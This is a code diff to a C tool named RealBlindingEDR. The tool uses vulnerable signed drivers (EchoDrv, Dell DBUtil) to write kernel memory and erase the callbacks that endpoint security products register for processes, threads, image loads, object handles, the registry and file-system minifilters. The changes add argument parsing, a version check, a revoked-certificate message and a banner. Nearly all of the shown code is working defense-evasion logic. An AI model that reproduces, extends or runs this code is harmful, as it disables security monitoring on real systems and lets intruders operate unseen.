@@ -60,13 +60,19 @@ BOOL LoadDriver() {
 		}
 		else
 		{
-			printf("Error Code: % lx\n", errcode);
+			if (errcode == 0xc0000603) {
+				printf("The driver's certificate has been revoked, please wait for the project to be updated..\n");
+			}
+			else {
+				printf("Error Code: % lx.\n", errcode);
+			}
+			
 			return FALSE;
 		}
 
 	}
 	else {
-		printf("Reg Add Error!\n");
+		printf("Reg Add Error, The program needs to be run with administrator privileges!\n");
 		return FALSE;
 	}
 }
@@ -99,8 +105,8 @@ VOID UnloadDrive() {
 	}
 }
 BOOL InitialDriver() {
-	//win7 鍔犺浇姝ら┍鍔ㄥ穿婧冿紝鍜屽悗闈唬鐮侀�昏緫鏃犲叧
-	if (DriverType == 1) {
+	//win7 加载此驱动崩溃，和后面代码逻辑无关
+	if (Driver_Type == 1) {
 		hDevice = CreateFile(L"\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hDevice == INVALID_HANDLE_VALUE) {
 			if (LoadDriver()) {
@@ -132,7 +138,7 @@ BOOL InitialDriver() {
 		}
 		Process = param->handle;
 	}
-	else if (DriverType == 2) {
+	else if (Driver_Type == 2) {
 		hDevice = CreateFile(L"\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hDevice == INVALID_HANDLE_VALUE) {
 			if (LoadDriver()) {
@@ -175,7 +181,7 @@ VOID DellWrite(VOID* Address, LONGLONG value) {
 	//printf("%d\n", BytesRead);
 }
 VOID DriverWriteMemery(VOID* fromAddress, VOID* toAddress, size_t len) {
-	if (DriverType == 1) {
+	if (Driver_Type == 1) {
 		ReadMem* req = (ReadMem*)malloc(sizeof(ReadMem));
 		req->fromAddress = fromAddress;
 		req->length = len;
@@ -188,7 +194,7 @@ VOID DriverWriteMemery(VOID* fromAddress, VOID* toAddress, size_t len) {
 			CloseHandle(hDevice);
 		}
 	}
-	else if (DriverType == 2) {
+	else if (Driver_Type == 2) {
 		if (len == 8) {
 			INT64* InttoAddress = (INT64*)toAddress;
 			INT64 dataAddr = DellRead(fromAddress);
@@ -417,10 +423,6 @@ VOID ClearThreeCallBack() {
 	INT64 PspCreateThreadNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateThreadNotifyRoutine");
 	INT64 PspLoadImageNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetLoadImageNotifyRoutine");
 
-	//printf("PspCreateProcessNotifyRoutineAddress: %I64x\n", PspCreateProcessNotifyRoutineAddress);
-	//printf("PspCreateThreadNotifyRoutineAddress: %I64x\n", PspCreateThreadNotifyRoutineAddress);
-	//printf("PspLoadImageNotifyRoutineAddress: %I64x\n", PspLoadImageNotifyRoutineAddress);
-
 	if (PspCreateProcessNotifyRoutineAddress) {
 		PrintAndClearCallBack(PspCreateProcessNotifyRoutineAddress, (CHAR*)"PsSetCreateProcessNotifyRoutine");
 	}
@@ -528,7 +530,6 @@ VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
 		DriverWriteMemery((VOID*)(Flink + 40), &EDRPreOperation, 8);
 		INT64 EDRPostOperation = 0;
 		DriverWriteMemery((VOID*)(Flink + 48), &EDRPostOperation, 8);
-		//printf("%s: EDRPreOperation: %I64x , %s: EDRPostOperation: %I64x \n", GetDriverName(EDRPreOperation), EDRPreOperation, GetDriverName(EDRPostOperation), EDRPostOperation);
 		CHAR* DriverName1 = GetDriverName(EDRPreOperation);
 		if (DriverName1 != NULL) {
 			if (IsEDR(DriverName1)) {
@@ -552,7 +553,7 @@ VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
 		CHAR* DriverName2 = GetDriverName(EDRPostOperation);
 		if (DriverName2 != NULL) {
 			if (IsEDR(DriverName2)) {
-				//娓呴櫎鍥炶皟
+				//清除回调
 				DriverWriteMemery(data, (VOID*)(Flink + 48), 8);
 				if (flag == 1) {
 					printf("Process PreOperation: %s [Clear]\n", DriverName2);
@@ -592,8 +593,6 @@ VOID ClearObRegisterCallbacks() {
 	printf("----------------------------------------------------\n");
 	printf("Drivers that register ObRegisterCallbacks callbacks: \n----------------------------------------------------\n\n");
 
-	/*printf("PsProcessTypeAddr: %I64x\n", PsProcessTypeAddr);
-	printf("PsThreadTypeAddr: %I64x\n", PsThreadTypeAddr);*/
 	RemoveObRegisterCallbacks(PsProcessTypeAddr, 1);
 	RemoveObRegisterCallbacks(PsThreadTypeAddr, 2);
 
@@ -626,7 +625,6 @@ VOID ClearCmRegisterCallback() {
 	}
 	printf("----------------------------------------------------\n");
 	printf("Register the CmRegisterCallback callback driver: \n----------------------------------------------------\n\n[Clear all below]\n");
-	//printf("CmUnRegisterCallbackAddr: %I64X\n", CmUnRegisterCallbackAddr);
 	UINT64 PsOffset = 0;
 
 	BYTE tmp[1] = { 0 };
@@ -733,7 +731,6 @@ BOOL IsEDRIntance(INT j, INT64 Flink) {
 	if (FilterName == NULL) return 0;
 	printf("\t\t[%d] %s : %I64x [Clear]\n", j, FilterName, Flink - 0x10);//_CALLBACK_NODE
 
-	//printf("EDRIntance: %d\n", k);
 	return Flag;
 }
 VOID RemoverInstanceCallback(INT64 FLT_FILTERAddr) {
@@ -760,7 +757,6 @@ VOID RemoverInstanceCallback(INT64 FLT_FILTERAddr) {
 		DriverWriteMemery((VOID*)(FilterInstanceAddr), &tmpAddr, 8);
 		FilterInstanceAddr = tmpAddr;
 	} while (FirstLink != FilterInstanceAddr);
-	//printf("\t\t%d\n",count);
 	count--;
 	INT i = 0;
 	do {
@@ -828,7 +824,6 @@ VOID ClearMiniFilterCallback() {
 		}
 		count++;
 	}
-	//printf("%I64x\n", FltEnumerateFiltersAddr);
 
 	UINT64 PsOffset = 0;
 
@@ -876,11 +871,9 @@ VOID ClearMiniFilterCallback() {
 	INT64 FLT_VOLUMESAddr = 0;
 	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0x130), &FLT_VOLUMESAddr, 8);
 
-	//printf("FLT_VOLUMESAddr111 ,%I64x\n", FLT_VOLUMESAddr);
 	ULONG FLT_VOLUMESCount = 0;
 	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0x140), &FLT_VOLUMESCount, 4);
 
-	//printf("FLT_VOLUMESCount %d\n", FLT_VOLUMESCount);
 
 	i = 0;
 	do {
@@ -952,13 +945,34 @@ VOID ClearMiniFilterCallback() {
 
 }
 
-int main()
+int main(int argc, char* argv[])
 {
+	printf(" _______               __  ______  __   _               __  _               ________ ______  _______     \n");
+	printf("|_   __ \\             [  ||_   _ \\[  | (_)             |  ](_)             |_   __  |_   _ `|_   __ \\    \n");
+	printf("  | |__) | .---. ,--.  | |  | |_) || | __  _ .--.  .--.| | __  _ .--.  .--./)| |_ \\_| | | `. \\| |__) |   \n");
+	printf("  |  __ / / /__\\`'_\\ : | |  |  __'.| |[  |[ `.-. / /'`\\' |[  |[ `.-. |/ /'`\\;|  _| _  | |  | ||  __ /    \n");
+	printf(" _| |  \\ \\| \\__.// | |,| | _| |__) | | | | | | | | \\__/  | | | | | | |\\ \\._/_| |__/ |_| |_.' _| |  \\ \\_  \n");
+	printf("|____| |___'.__.\\'-;__[___|_______[___[___[___||__'.__.;__[___[___||__.',__|________|______.|____| |___| \n");
+	printf("                                                                     ( ( __))                            \n");
+	if (argc != 3) {
+		printf("Usage: RealBlindingEDR.exe [driver_path] [driver_type]\n\neg: RealBlindingEDR.exe c:\\echo_driver.sys 1\n");
+		return 0;
+	}
+	DrivePath = argv[1];
+	Driver_Type = atoi(argv[2]);
+
 	HINSTANCE hinst = LoadLibraryA("ntdll.dll");
 	if (hinst == NULL) return FALSE;
 	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
 	proc(&dwMajor, &dwMinorVersion, &dwBuild);
 	dwBuild &= 0xffff;
+	if (dwMajor < 10 && Driver_Type == 1) {
+		printf("[ERROR] This driver does not support the %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
+		return 0;
+	}
+	else {
+		printf("Windows version: %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
+	}
 	if (!InitialDriver()) return 0;
 
 	ClearThreeCallBack();
@@ -967,6 +981,6 @@ int main()
 	ClearMiniFilterCallback();
 	
 	UnloadDrive();
-	system("pause");
+	//system("pause");
 }
 
